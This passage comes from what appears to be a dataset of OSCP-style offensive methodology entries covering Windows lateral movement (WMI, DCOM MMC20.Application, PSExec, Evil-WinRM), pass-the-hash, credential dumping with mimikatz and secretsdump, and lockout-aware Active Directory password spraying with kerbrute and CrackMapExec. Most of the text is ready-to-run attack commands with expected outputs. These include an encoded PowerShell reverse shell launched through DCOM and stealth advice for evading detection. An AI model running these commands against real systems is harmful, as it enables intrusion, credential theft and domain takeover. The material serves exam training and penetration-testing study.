uploaded, no service created, execution in memory."", ""commands"": [""wmi-creds-pscredential"", ""wmi-invoke-wmimethod"", ""wmic-process-create""], ""expected_outcome"": ""Invoke-WmiMethod output: 'ProcessId ReturnValue ---------- ----------- 4532 0'. ReturnValue 0 = success. ProcessId 4532 = PID of spawned PowerShell process on target. Your reverse shell payload (encoded in BASE64_PAYLOAD) executes on target, connects back to your listener (nc -lvnp 443). You receive shell: 'connect to [10.10.14.5] from 192.168.50.200'. Execution is fileless - no dropped exe, no service creation, only WMI event logs (Event ID 5857-5861 in Microsoft-Windows-WMI-Activity/Operational). Much stealthier than PSExec. Disadvantage: Shell runs as authenticated user (not SYSTEM), requires base64-encoded payload for complex commands, WMI process creation is semi-interactive at best."", ""why_this_works"": ""WMI (Windows Management Instrumentation) is Microsoft's framework for querying system information and executing administrative tasks. Win32_Process class has Create method that spawns new processes - essentially remote CreateProcess() via RPC. WMI communication uses DCOM (Distributed COM) over RPC port 135 + ephemeral high ports (49152-65535). Authentication uses Kerberos or NTLM. Advantages over PSExec: (1) Fileless - no binary uploaded, (2) No service creation (stealthier event logs), (3) Built into Windows (no external tools needed). Disadvantages: (1) Not truly interactive (no stdin/stdout redirection), (2) Process runs as user (not SYSTEM), (3) Requires Windows machine to execute wmic.exe (or PowerShell Invoke-WmiMethod). Impacket wmiexec exists for Kali but provides worse shell than Evil-WinRM.""}, {""title"": ""Scenario 5: DCOM - Fallback When Everything Else Fails"", ""context"": ""You've tried WinRM (service disabled), PSExec (File and Printer Sharing blocked by firewall), WMI (WMI service disabled via GPO). Port 135 (RPC) is still open. You're on a compromised Windows machine with PowerShell access. DCOM (Distributed COM) provides alternative RPC-based lateral movement using MMC20.Application COM object."", ""approach"": ""DCOM lateral movement via MMC20.Application: (1) Create PSCredential object, (2) Instantiate remote COM object: $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','192.168.50.75')), (3) Execute command: $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c <COMMAND>','7'). This leverages MMC COM object for remote code execution. Works when WMI blocked because it uses different DCOM endpoint. Discovered by @enigma0x3 in 2017."", ""commands"": [""dcom-verify-rpc-port"", ""dcom-mmc20-calc-poc"", ""dcom-mmc20-revshell""], ""expected_outcome"": ""Test with calculator PoC first: $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c calc.exe','7'). Calculator spawns on target (verify with: tasklist /S 192.168.50.75 /U admin /P P@ssw0rd | findstr calc). Success! Now deploy reverse shell: $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c powershell -nop -w hidden -e <BASE64>','7'). Netcat listener receives connection. DCOM execution is stealthy (no service creation, no binary upload), but processes run in Session 0 (non-interactive desktop, invisible to logged-in users). This technique is rare - most defenders focus on WMI/PSExec detection, DCOM often overlooked."", ""why_this_works"": ""DCOM (Distributed Component Object Model) allows COM objects to be instantiated and called remotely via RPC. MMC20.Application is a scriptable COM object (ProgID: MMC20.Application) designed for MMC (Microsoft Management Console) automation. It has ExecuteShellCommand method that runs arbitrary commands. Exploitation: (1) Authenticate via RPC (port 135), (2) Request MMC20.Application object from remote registry, (3) Call ExecuteShellCommand method with command arguments. Requirements: RPC port 135 accessible, user has admin rights on target (DCOM activation security), MMC application available (default on all Windows). Uses same RPC port as WMI (135) but different DCOM endpoint, so works when WMI is blocked. Commands run in Session 0 (non-interactive) as authenticated user. OSCP relevance: High - critical fallback when primary techniques fail.""}, {""title"": ""Scenario 6: Troubleshooting Lateral Movement Failures"", ""context"": ""Your lateral movement attempt failed. You got: 'STATUS_LOGON_FAILURE' (authentication issue), 'Connection timeout' (firewall), 'Access denied' (insufficient privileges), or 'Service unavailable' (target service disabled). You need systematic troubleshooting to identify root cause and try alternatives."", ""approach"": ""Step 1: Verify credentials - Test with CrackMapExec: crackmapexec smb <TARGET> -u <USER> -p <PASS> (or -H <HASH>). Look for [+] vs [-]. Step 2: Check ports - nmap -p 135,139,445,5985,5986 -Pn <TARGET>. Step 3: Test share access - smbclient -L //<TARGET> -U <USER>. Step 4: Verify service status - Use CrackMapExec modules to probe WinRM/WMI availability. Step 5: Check UAC restrictions - If local admin hash doesn't work, try domain account hash. Step 6: Alternative technique - WinRM failed? Try PSExec. PSExec failed? Try WMI. WMI failed? Try DCOM."", ""commands"": [""lateral-movement-troubleshooting"", ""psexec-verify-firewall"", ""cme-smb-auth-test""], ""expected_outcome"": ""CrackMapExec test output: '[-] corp\\user:Password123 STATUS_LOGON_FAILURE' \u2192 Credentials are wrong (typo, password expired, account locked). Fix: Verify credentials, try different account. Output: '[+] corp\\admin:P@ssw0rd (Pwn3d!)' but PSExec fails with 'Connection timeout' \u2192 Credentials work but firewall blocking SMB/RPC. Check nmap: 445 open but 135 filtered \u2192 File and Printer Sharing allowed, but RPC blocked \u2192 PSExec will fail (needs both), WinRM might work if 5985 open. Output: '[+] 192.168.50.75\\administrator:<HASH>' but PSExec gives 'Access denied' \u2192 Hash authentication works but not for local admin (UAC remote restrictions, MS14-068 patch blocks non-RID-500 local admin hashes over network). Fix: Try domain account hash or use RID-500 administrator account. Systematic troubleshooting cuts debugging time from 20 minutes to 2 minutes in exam."", ""why_this_works"": ""Lateral movement failures have distinct patterns: (1) Authentication failures (wrong creds, account disabled, NTLMv2 vs NTLMv1 mismatch) - test with CrackMapExec first, (2) Firewall blocks (ports filtered) - verify with nmap, (3) Service disabled (port open but service not listening) - WinRM port 5985 open doesn't guarantee WinRM service enabled, (4) UAC restrictions (2014 patch blocks local admin hashes except RID-500) - affects pass-the-hash attacks, (5) Group membership (user not in Remote Management Users for WinRM) - affects WinRM specifically. By testing in order (creds \u2192 ports \u2192 services \u2192 alternatives), you systematically eliminate possibilities. CrackMapExec is perfect for this - tests authentication separately from exploitation, gives clear [+]/[-] indicators, fast (2-3 seconds per test).""}]","[{""title"": ""Phase 1: Reconnaissance - Which Techniques Are Available?"", ""notes"": ""Before attempting lateral movement, identify which ports are open and which services are enabled on target. This determines which techniques will work. Quick port check with nmap -p 135,139,445,3389,5985,5986 -Pn -v <TARGET>. Port 5985/5986 open \u2192 WinRM possible. Port 445 open \u2192 PSExec/SMB possible. Port 135 open \u2192 WMI/DCOM possible. Port 3389 open \u2192 RDP possible (not lateral movement but useful for interactive access)."", ""commands"": [{""id"": ""lateral-movement-port-check"", ""example"": ""sudo nmap -p 135,445,5985,5986,3389 -Pn -sV -v 192.168.50.73"", ""shows"": ""135/tcp open  msrpc (Microsoft RPC)""}, {""id"": ""cme-smb-auth-test"", ""shows"": ""See command documentation""}, {""id"": ""cme-winrm"", ""example"": ""crackmapexec winrm 192.168.1.1 -u administrator -p Password123"", ""shows"": ""Credentials found or hash cracked""}]}, {""title"": ""Phase 2: Primary Technique Selection (WinRM or PSExec)"", ""notes"": ""For OSCP, prioritize: (1) WinRM from Kali (if port 5985/5986 open and you have password or hash) - provides best interactive shell. (2) PSExec from Kali (if port 445 open and you have local admin creds) - provides SYSTEM shell immediately. These two techniques cover 80% of OSCP lateral movement scenarios. WinRM advantages: interactive PowerShell, file transfer, stable. PSExec advantages: SYSTEM privileges, works on all Windows versions, most documented."", ""commands"": [{""id"": ""evil-winrm-creds"", ""example"": ""evil-winrm -i 192.168.50.73 -u jen -p 'Nexus123!'"", ""shows"": ""Evil-WinRM shell v3""}, {""id"": ""evil-winrm-hash"", ""example"": ""evil-winrm -i 192.168.50.73 -u administrator -H 64f12cddaa88057e06a81b54e73b949b"", ""shows"": ""Evil-WinRM shell v3""}, {""id"": ""psexec-impacket-shell"", ""example"": ""impacket-psexec corp.com/administrator:Nexus123!@192.168.50.73"", ""shows"": ""[*] Requesting shares on <TARGET>""}, {""id"": ""cme-smb-shares"", ""example"": ""crackmapexec smb 192.168.50.73 -u administrator -p Nexus123! --shares"", ""shows"": ""[+] <DOMAIN>\\<USER>:<PASS> (Pwn3d!)""}]}, {""title"": ""Phase 3: Alternative Techniques (WMI, DCOM)"", ""notes"": ""When WinRM and PSExec fail (services disabled, firewall rules, GPO restrictions), fall back to: (1) WMI - If you have access to compromised Windows machine with PowerShell. Fileless execution, stealthier than PSExec. Use Invoke-WmiMethod or wmic.exe. (2) DCOM - If WMI service disabled but RPC port 135 open. MMC20.Application COM object provides remote command execution. Both require port 135 (RPC) accessible."", ""commands"": [{""id"": ""wmi-invoke-wmimethod"", ""shows"": ""See command documentation""}, {""id"": ""wmic-process-create"", ""shows"": ""See command documentation""}, {""id"": ""dcom-mmc20-revshell"", ""example"": ""$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\""MMC20.Application.1\"",\""192.168.50.73\"")); $dcom.Document.ActiveView.ExecuteShellCommand(\""powershell\"",$null,\""powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...\"",\""7\"")"", ""shows"": ""Netcat listener receives connection""}, {""id"": ""dcom-verify-rpc-port"", ""example"": ""Test-NetConnection 192.168.50.73 -Port 135"", ""shows"": ""TcpTestSucceeded : True""}]}, {""title"": ""Phase 4: Authentication Methods (Password, Hash, Ticket)"", ""notes"": ""Lateral movement tools support multiple authentication types: (1) Password - Works with all tools (WinRM, PSExec, WMI, DCOM). Easiest to use. (2) NTLM Hash - Pass-the-hash attacks work with: Impacket tools (psexec, wmiexec, smbexec), Evil-WinRM (-H flag), CrackMapExec (-H flag). Requires hash in format: 32 hex characters (NTLM only, discard LM hash). (3) Kerberos Ticket - Pass-the-ticket or overpass-the-hash for tools requiring Kerberos (Microsoft PsExec, some COM objects). Most complex but enables certain Windows-native tools."", ""commands"": [{""id"": ""pth-impacket-psexec"", ""example"": ""impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73"", ""shows"": ""[*] Requesting shares on <TARGET>""}, {""id"": ""pth-impacket-wmiexec"", ""example"": ""impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73"", ""shows"": ""[*] SMBv3.0 dialect used""}, {""id"": ""evil-winrm-hash"", ""example"": ""evil-winrm -i 192.168.50.73 -u administrator -H 64f12cddaa88057e06a81b54e73b949b"", ""shows"": ""Evil-WinRM shell v3""}, {""id"": ""overpass-mimikatz-pth"", ""example"": ""mimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell"", ""shows"": ""user : <USER>""}]}, {""title"": ""Phase 5: Post-Exploitation (Credential Harvesting for Further Lateral Movement)"", ""notes"": ""After successful lateral movement and gaining shell on target, immediately dump credentials for further movement: (1) SAM hashes - reg save HKLM\\SAM sam.hive; reg save HKLM\\SYSTEM system.hive. Parse with secretsdump. (2) LSASS memory - Upload Mimikatz, run sekurlsa::logonpasswords. (3) Cached domain credentials - secretsdump -security -sam -system. (4) Spray obtained hashes - Use CrackMapExec to test hashes against entire subnet: crackmapexec smb 192.168.50.0/24 -u Administrator -H <HASH> --local-auth. Identify all machines where hash is reused."", ""commands"": [{""id"": ""secretsdump-hashes"", ""example"": ""impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'"", ""shows"": ""Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor...""}, {""id"": ""mimikatz-logonpasswords"", ""shows"": ""See command documentation""}, {""id"": ""pth-cme-spray"", ""example"": ""crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E"", ""shows"": ""[+] <TARGET> (Pwn3d!)""}]}, {""title"": ""Phase 6: Troubleshooting Common Failures"", ""notes"": ""Common failures and fixes: (1) STATUS_LOGON_FAILURE - Credentials wrong, test with CrackMapExec first. (2) Connection timeout - Firewall blocking ports, verify with nmap. (3) Access denied (credentials work but technique fails) - Service disabled or UAC blocking. Try alternative technique. (4) Hash doesn't work but password does - UAC remote restrictions (MS14-068 patch). Use domain account hash instead of local admin. (5) WinRM port open but connection fails - WinRM service might be disabled despite port being open (rare but happens). Try PSExec. (6) All techniques fail - Check if target is Windows (not Linux), verify network connectivity (ping -c 1 <TARGET>), confirm credentials are for correct domain (DOMAIN\\user vs user@DOMAIN.com)."", ""commands"": [{""id"": ""lateral-movement-troubleshooting"", ""example"": ""# Test credentials: crackmapexec smb 192.168.45.100 -u admin -p password\n# Test admin access: crackmapexec smb 192.168.45.100 -u admin -p password --shares\n# Test hash: crackmapexec smb 192.168.45.100 -u admin -H abc123...\n# Check UAC restriction: If local admin hash fails but domain user works, UAC blocking PTH\n# Verify ports: sudo nmap -p 135,445,5985 -Pn -v 192.168.45.100\n# Check firewall: Test-NetConnection 192.168.45.100 -Port 80 from Windows\n# Time sync: net time \\\\192.168.45.100 (Kerberos requires <5 min time skew)\n# Service status: Get-Service WinRM,RpcSs -ComputerName 192.168.45.100"", ""shows"": ""[+] Pwn3d! from CrackMapExec (admin access confirmed)""}, {""id"": ""psexec-verify-firewall"", ""example"": ""sudo nmap -p 445,135 -Pn -sV -v 192.168.50.73"", ""shows"": ""445/tcp open  microsoft-ds""}, {""id"": ""cme-smb-auth-test"", ""shows"": ""See command documentation""}, {""id"": ""lateral-movement-decision-tree"", ""shows"": ""See command documentation""}]}]"
"ad-password-spraying-methodology","Active Directory Password Spraying Methodology","Complete methodology for safe and effective password spraying attacks against Active Directory - from policy discovery through credential validation to privilege escalation","ACTIVE_DIRECTORY|PASSWORD_SPRAY|METHODOLOGY|OSCP:HIGH|WORKFLOW","{""how_to_recognize"": [""You have network access to a domain controller (port 88 Kerberos, 389 LDAP, or 445 SMB)"", ""You've identified an Active Directory environment but lack valid credentials"", ""You have a list of potential usernames from OSINT, enumeration, or username wordlists"", ""You want to test a common password across many users without locking accounts""], ""when_to_look_for"": [""During external penetration tests when you've identified AD but have no credentials"", ""After gaining initial access to a network but before obtaining domain credentials"", ""When you've found a potential default/common password and want to test it domain-wide"", ""OSCP exam: When you need valid AD credentials and brute force is not practical due to lockout policies""]}","[{""title"": ""Scenario 1: External Password Spray - No Domain Access"", ""context"": ""You're performing an external penetration test. You've identified a domain controller at 192.168.50.70 (domain: corp.com) via port scanning. You can reach Kerberos port 88/UDP but have NO credentials and NO network access to internal resources. You want to spray a common password (Nexus123!) to gain initial domain access."", ""approach"": ""Use Kerbrute for external password spraying. This is the ONLY method that works without domain access - requires only UDP 88 to DC. First enumerate valid usernames with a wordlist, then spray a single common password. This generates minimal network traffic (2 UDP packets per attempt) and is extremely stealthy."", ""commands"": [""kerbrute-userenum-ad"", ""kerbrute-passwordspray"", ""kerbrute-validate-creds"", ""crackmapexec-validate-admin""], ""expected_outcome"": ""Kerbrute userenum identifies 5-20 valid usernames from your wordlist (e.g., pete, jen, dave). Password spray with 'Nexus123!' reveals 2 valid credentials: pete:Nexus123! and jen:Nexus123!. You now have domain credentials for initial access. Next step: test if these users have local admin rights on any systems with crackmapexec."", ""why_this_works"": ""Kerberos pre-authentication (AS-REQ) validates usernames and passwords without requiring full domain login or network access. The domain controller responds differently for valid users (PREAUTH_REQUIRED) vs invalid users (PRINCIPAL_UNKNOWN), and for correct passwords (TGT issued) vs wrong passwords (PREAUTH_FAILED). This is by-design Kerberos behavior, not a vulnerability. No SMB, RDP, or LDAP access needed - only UDP 88 to DC. TIME ESTIMATE: 5 minutes for username enum (10k usernames) + 30 seconds for password spray (50 valid users). STEALTH: Minimal logging - Event ID 4768 for valid creds, 4771 for wrong passwords (normal AD traffic).""}, {""title"": ""Scenario 2: Internal Password Spray from Windows - Policy-Aware LDAP Method"", ""context"": ""You've compromised a Windows 10 workstation via web exploitation and have a PowerShell session as domain user corp\\webuser. You're on CLIENT75 (192.168.50.75) in the corp.com domain. You want to spray passwords safely without locking accounts. The password policy shows: 5 attempt lockout threshold, 30 minute observation window, 30 minute lockout duration."", ""approach"": ""Use PowerShell LDAP password spraying (Spray-Passwords.ps1) from the compromised Windows system. This method automatically reads the password policy and respects lockout settings. It generates minimal network traffic and appears as normal LDAP authentication. Execute from PowerShell with bypass to avoid execution policy blocks."", ""commands"": [""net-accounts-policy"", ""spray-passwords-ldap"", ""crackmapexec-validate-admin""], ""expected_outcome"": ""net accounts confirms policy: 5 attempt threshold, 30min window. Spray-Passwords.ps1 with 'Nexus123!' identifies valid credentials: pete:Nexus123! and jen:Nexus123! (automatically tested -Admin flag to include admin accounts). Script automatically limits attempts to stay under lockout threshold. Validate with CrackMapExec to check for local admin rights across network. TIME ESTIMATE: Check policy (5 seconds) + spray 100 users (2-3 minutes) + validate (30 seconds) = ~4 minutes total."", ""why_this_works"": ""PowerShell DirectoryEntry uses System.DirectoryServices to create LDAP connections. The constructor new DirectoryEntry(LDAP_PATH, USERNAME, PASSWORD) attempts authentication. Success = object created with distinguishedName property. Failure = exception thrown. The script enumerates all domain users via LDAP query, then attempts authentication for each user. It respects the password policy by automatically spacing attempts according to lockout threshold and observation window. Generates Event ID 4776 (NTLM auth) for each attempt - looks like normal user logins.""}, {""title"": ""Scenario 3: Internal Password Spray from Linux - Comparing All Three Methods"", ""context"": ""You're on a Kali Linux attack box inside the corp.com network. You have network access to DC at 192.168.50.70 and workstation CLIENT75 at 192.168.50.75. You've already obtained the password policy (5 attempt threshold, 30min window) and have a list of 50 valid usernames. You want to spray the password 'Nexus123!' and understand the trade-offs between SMB (CrackMapExec), Kerberos (kerbrute), and LDAP methods."", ""approach"": ""Compare all three password spraying methods to understand their characteristics. Use Kerbrute for speed and stealth (FASTEST, 2 UDP packets), CrackMapExec SMB for admin detection (NOISIEST but shows Pwn3d!), and test understanding of when to use each. In practice, prefer Kerbrute for initial spray, then CrackMapExec for validation and admin checking."", ""commands"": [""crackmapexec-policy"", ""kerbrute-userenum-ad"", ""kerbrute-passwordspray"", ""crackmapexec-smb-spray"", ""crackmapexec-validate-admin""], ""expected_outcome"": ""METHOD COMPARISON: (1) Kerbrute: Completes in 10 seconds, finds pete:Nexus123! and jen:Nexus123!, minimal noise. (2) CrackMapExec SMB: Completes in 2 minutes (slower), finds same credentials, shows dave:Flowers1 (Pwn3d!) = local admin. (3) Decision: Use Kerbrute for bulk spraying (fast, stealthy), then CrackMapExec for privilege checking. TRADE-OFFS: Kerbrute = Speed/Stealth, CME = Admin Detection, PowerShell LDAP = Policy-Aware."", ""why_this_works"": ""KERBRUTE: Uses Kerberos AS-REQ (2 UDP packets per attempt). Response time: <50ms. Network traffic: ~500 bytes total. Events: 4768/4771 (normal). CRACKMAPEXEC SMB: Uses full SMB connection + NTLM auth (10+ packets per attempt). Response time: 2-3 seconds. Network traffic: ~5KB per attempt. Events: 4625 (failed logon) or 4624 (success) - highly visible. Pwn3d! = admin check via ADMIN$ share access. POWERSHELL LDAP: Uses LDAP bind (4-6 packets per attempt). Response time: ~1 second. Network traffic: ~2KB per attempt. Events: 4776 (credential validation) - looks like normal auth. SUMMARY: Pick method based on: External access? \u2192 Kerbrute only. Need admin detection? \u2192 CrackMapExec. Maximum stealth? \u2192 Kerbrute. Policy-aware automation? \u2192 PowerShell LDAP. TIME ESTIMATE: Kerbrute (50 users): 10 sec. CME SMB (50 users): 2 min. PS LDAP (50 users): 1 min.""}, {""title"": ""Scenario 4: Lockout-Safe Time-Delayed Spraying - Avoiding Account Locks"", ""context"": ""You're testing corp.com domain with STRICT password policy: 3 attempt lockout threshold, 15 minute observation window, 60 minute lockout duration. You have 200 users and want to test 5 common passwords without locking ANY accounts. Standard tools don't check policy automatically. You need to manually calculate safe spray timing and track attempts."", ""approach"": ""Manually implement lockout-safe spraying strategy. CALCULATION: 3 threshold = max 2 attempts per user per 15min window. Strategy: Spray password 1 against all users (2 attempts used), wait 16 minutes for observation window to reset, spray password 2 (2 more attempts), wait 16 minutes, repeat. Use Kerbrute for speed. Track progress to avoid confusion. This is CRITICAL for OSCP exam - locking accounts alerts admins and may fail the exam."", ""commands"": [""crackmapexec-policy"", ""kerbrute-userenum-ad"", ""kerbrute-passwordspray"", ""kerbrute-validate-creds""], ""expected_outcome"": ""SAFE SPRAY TIMELINE: T+0min: Check policy (3 threshold, 15min window). T+1min: Spray password 'Winter2023!' (200 users, 30 seconds). T+16min: Spray password 'Summer2023!' (200 users, 30 seconds). T+32min: Spray password 'Spring2023!'. Pattern: 2 attempts used per cycle, 15min wait between cycles. RESULT: Tested 5 passwords across 200 users (1000 total attempts) in 65 minutes with ZERO lockouts. Found credentials: alice:Winter2023!, bob:Summer2023!. LOCKOUT MATH: 2 attempts / 15min window = 8 attempts/hour safely. Over 24 hours = 192 safe attempts per user (assuming users don't fail logins themselves)."", ""why_this_works"": ""Account lockout counter RESETS after the observation window expires. Example: User fails login at 10:00, 10:05, 10:10 (2 attempts). Counter = 2. At 10:25 (15min after LAST failure at 10:10), observation window expires and counter resets to 0. You can safely attempt again at 10:26. CRITICAL: Observation window is measured from LAST failed attempt, not first. So spread attempts within window (10:00, 10:05, 10:10 all count toward same window) but wait 15min after LAST attempt (10:10 + 15min = 10:25) before next attempt. AUTOMATION: Tools like Spray-Passwords.ps1 do this automatically. Manual spraying with Kerbrute/CME requires YOU to track timing. Use script: for pwd in pwd1 pwd2 pwd3; do kerbrute passwordspray -d corp.com --dc DC_IP users.txt \""$pwd\""; sleep 960; done (960 seconds = 16 minutes). TIME ESTIMATE: (passwords \u00d7 spray_time) + ((passwords - 1) \u00d7 observation_window). Example: 5 passwords \u00d7 30sec + 4 \u00d7 16min = 2.5min + 64min = 66.5 minutes total.""}, {""title"": ""Scenario 5: Post-Spray Validation and Privilege Escalation Path"", ""context"": ""You've successfully sprayed 'Nexus123!' against corp.com and found 3 valid credentials: pete:Nexus123!, jen:Nexus123!, dave:Flowers1 (dave was from a different spray). Now you need to: (1) Validate credentials are truly valid, (2) Check which users have local admin rights, (3) Identify best path for lateral movement and privilege escalation."", ""approach"": ""Multi-step validation and privilege mapping. First, quick-validate all credentials with Kerbrute to confirm they work. Second, use CrackMapExec to scan entire subnet (192.168.50.0/24) to find which systems each user has admin rights on. Third, identify best pivot point (user with most admin access or access to critical systems like servers). Fourth, use valid credentials for lateral movement."", ""commands"": [""kerbrute-validate-creds"", ""crackmapexec-validate-admin"", ""crackmapexec-smb-spray"", ""evil-winrm"", ""psexec""], ""expected_outcome"": ""VALIDATION RESULTS: (1) Kerbrute confirms all 3 credentials are valid (pete, jen, dave all authenticate successfully). (2) CrackMapExec subnet scan shows: pete = standard user (no admin anywhere), jen = local admin on 3 workstations (CLIENT74, CLIENT76, CLIENT80), dave = local admin on 15 systems including SERVER01 (Pwn3d!). (3) DECISION: Prioritize dave credentials - has widest access including server. (4) ACTION: Use evil-winrm with dave:Flowers1 to access SERVER01, dump SAM/LSA secrets with secretsdump, find cached Domain Admin credentials or service account with high privileges. LATERAL MOVEMENT PATH: dave@CLIENT75 \u2192 dave@SERVER01 (Pwn3d!) \u2192 extract credentials \u2192 Domain Admin or high-privilege service account \u2192 full domain compromise."", ""why_this_works"": ""LOCAL ADMIN RIGHTS don't grant domain-wide privileges but allow you to: (1) Execute code with SYSTEM privileges on those machines. (2) Dump local SAM database for additional credentials. (3) Dump LSA secrets for cached domain credentials. (4) Dump LSASS memory for plaintext passwords and Kerberos tickets. (5) Pivot to other systems using extracted credentials. CRITICAL OSCP STRATEGY: A single local admin account on one workstation can lead to domain compromise if that workstation has cached Domain Admin credentials or if you can steal Kerberos tickets for lateral movement. CrackMapExec subnet scan (192.168.50.0/24) shows which systems display (Pwn3d!) for each user. TIME ESTIMATE: Validation (5 seconds) + subnet scan 254 IPs (2-3 minutes) + evil-winrm connection (10 seconds) + secretsdump (30 seconds) = ~4 minutes to full system access.""}]","[{""title"": ""Phase 1: Password Policy Discovery - MANDATORY FIRST STEP"", ""notes"": ""ALWAYS discover password policy BEFORE spraying to avoid account lockouts. Lockout threshold tells you max attempts before lockout. Observation window tells you how long to wait between spray rounds. Lockout duration tells you how long accounts stay locked. CALCULATION: Safe attempts = (threshold - 1) per observation window. Example: 5 threshold, 30min window = spray 4 passwords max, wait 30min, repeat. Without this step you risk locking out accounts and alerting administrators."", ""commands"": [{""id"": ""net-accounts-policy"", ""example"": ""net accounts"", ""shows"": ""Force user logoff how long after time expires?""}, {""id"": ""enum4linux-policy"", ""example"": ""enum4linux -P 192.168.50.70"", ""shows"": ""Password Complexity""}, {""id"": ""crackmapexec-policy"", ""example"": ""crackmapexec smb 192.168.50.70 -u guest -p '' --pass-pol"", ""shows"": ""[+] Dumping password policy""}, {""id"": ""ldapsearch-policy"", ""example"": ""ldapsearch -x -H ldap://192.168.50.70 -b 'DC=corp,DC=com' -s base '(objectClass=*)' lockoutThreshold lockoutDuration lockOutObservationWindow minPwdLength pwdProperties"", ""shows"": ""lockoutThreshold:""}]}, {""title"": ""Phase 2: Username Enumeration - Build Target List"", ""notes"": ""Spray passwords against VALID usernames only to avoid wasting attempts and generating noise. Use Kerbrute for fastest enumeration (thousands of usernames per second). Alternatively use LDAP/SMB enumeration if you have credentials or null session access. Save valid usernames to file for spraying. WORDLIST RECOMMENDATIONS: /usr/share/seclists/Usernames/Names/names.txt (common first names), /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt (comprehensive). TIME ESTIMATE: 30-60 seconds for 10k usernames with Kerbrute."", ""commands"": [{""id"": ""kerbrute-userenum-ad"", ""example"": ""kerbrute userenum -d corp.com --dc 192.168.50.70 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"", ""shows"": ""[+] VALID USERNAME:""}, {""id"": ""enum4linux-users-ad"", ""example"": ""enum4linux -U 192.168.50.70"", ""shows"": ""user:""}, {""id"": ""crackmapexec-rid-cycling"", ""example"": ""crackmapexec smb 192.168.50.70 -u guest -p '' --rid-brute"", ""shows"": ""[+]""}, {""id"": ""ldapsearch-users-ad"", ""example"": ""ldapsearch -x -H ldap://192.168.50.70 -b 'DC=corp,DC=com' '(&(objectClass=user)(objectCategory=person))' sAMAccountName userPrincipalName"", ""shows"": ""sAMAccountName:""}]}, {""title"": ""Phase 3: Password Spraying - Choose Method Based on Context"", ""notes"": ""METHOD SELECTION GUIDE: (1) External access only (no domain network)? \u2192 Use Kerbrute (only option). (2) Windows domain-joined system? \u2192 Use Spray-Passwords.ps1 (policy-aware). (3) Linux with network access? \u2192 Use Kerbrute for speed/stealth OR CrackMapExec for admin detection. (4) Need to identify local admin rights? \u2192 Use CrackMapExec (Pwn3d! indicator). (5) Maximum stealth required? \u2192 Use Kerbrute (minimal logging). SAFE SPRAYING: Calculate safe attempts = (lockout_threshold - 1) attempts per (observation_window) minutes. Use conservative password list (3-5 common passwords) rather than extensive wordlist."", ""commands"": [{""id"": ""spray-passwords-ldap"", ""example"": ""powershell -ep bypass -c \""C:\\Tools\\Spray-Passwords.ps1 -Pass Nexus123! -Admin\"""", ""shows"": ""Guessed password for user:""}, {""id"": ""crackmapexec-smb-spray"", ""example"": ""crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success"", ""shows"": ""[+]""}, {""id"": ""kerbrute-passwordspray"", ""example"": ""kerbrute passwordspray -d corp.com --dc 192.168.50.70 valid_users.txt 'Nexus123!'"", ""shows"": ""[+] VALID LOGIN:""}, {""id"": ""crackmapexec-winrm-spray"", ""example"": ""crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com"", ""shows"": ""[+]""}]}, {""title"": ""Phase 4: Credential Validation and Admin Rights Discovery"", ""notes"": ""After finding potential credentials, validate them and check for local admin rights. Kerbrute for quick validation (is password correct?). CrackMapExec for admin detection (does user have local admin anywhere?). SUBNET SCANNING: Use CrackMapExec with CIDR notation to scan entire subnet: crackmapexec smb 192.168.50.0/24 -u USERNAME -p PASSWORD -d DOMAIN. Look for (Pwn3d!) indicator = local admin rights = full system compromise possible. TIME ESTIMATE: Single host validation (5 sec), /24 subnet scan (2-3 min)."", ""commands"": [{""id"": ""kerbrute-validate-creds"", ""example"": ""kerbrute passwordspray -d corp.com --dc 192.168.50.70 single_user.txt 'Nexus123!'"", ""shows"": ""[+] VALID LOGIN:""}, {""id"": ""crackmapexec-validate-admin"", ""example"": ""crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com"", ""shows"": ""[+]""}]}, {""title"": ""Phase 5: Lateral Movement and Privilege Escalation"", ""notes"": ""Use validated credentials with local admin rights for lateral movement. TOOLS: evil-winrm (WinRM access), psexec (SMB/SYSTEM shell), wmiexec (WMI/SYSTEM shell), smbexec (SMB without touching disk). OBJECTIVES: (1) Dump SAM/LSA secrets for additional credentials. (2) Dump LSASS memory for Kerberos tickets and plaintext passwords. (3) Search for cached Domain Admin credentials. (4) Identify service accounts with high privileges. (5) Look for Kerberoastable accounts. (6) Pivot to additional systems. OSCP TIP: Local admin on workstation \u2192 dump credentials \u2192 find Domain Admin cached creds or Kerberos tickets \u2192 full domain compromise."", ""commands"": [{""id"": ""crackmapexec-validate-admin"", ""example"": ""crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com"", ""shows"": ""[+]""}, {""id"": ""evil-winrm"", ""shows"": ""See command documentation""}, {""id"": ""psexec"", ""shows"": ""See command documentation""}, {""id"": ""secretsdump"", ""shows"": ""See command documentation""}, {""id"": ""mimikatz"", ""shows"": ""See command documentation""}]}]"
